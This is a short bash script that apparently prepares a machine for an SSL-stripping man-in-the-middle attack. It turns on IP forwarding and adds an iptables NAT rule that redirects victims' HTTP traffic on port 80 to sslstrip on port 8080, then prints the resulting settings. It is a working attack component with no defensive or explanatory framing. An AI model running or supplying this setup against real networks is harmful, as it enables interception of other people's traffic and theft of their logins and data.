#!/bin/bash

echo "[*] Enabling IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] IP Forwarding status:"
cat /proc/sys/net/ipv4/ip_forward

echo "[*] Configuring iptables to redirect HTTP traffic (port 80) to sslstrip (port 8080)..."
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

echo "[*] iptables configuration:"
iptables -t nat -L -v -n

echo "[+] Setup complete."
